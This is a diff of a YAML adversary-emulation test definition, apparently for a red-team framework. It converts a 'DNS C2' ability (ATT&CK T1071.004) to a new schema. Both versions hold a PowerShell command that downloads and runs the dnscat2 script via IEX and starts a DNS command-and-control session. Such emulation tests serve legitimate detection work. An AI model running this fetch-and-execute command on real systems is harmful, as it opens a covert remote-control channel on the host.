@@ -1,4 +1,4 @@
-- id: 3ade179d-a82f-5a81-89aa-999c6fef0641
+- requirements: []
   name: Soumaia ART Tests - DNS C2
   description: 'This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
 
@@ -10,12 +10,14 @@
 
     https://github.com/lukebaggett/dnscat2-powershell'
   tactic: command-and-control
-  technique:
-    attack_id: T1071.004
-    name: 'Application Layer Protocol: DNS'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
-          Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1
+  technique_id: T1071.004
+  technique_name: 'Application Layer Protocol: DNS'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1
+  id: 3ade179d-a82f-5a81-89aa-999c6fef0641
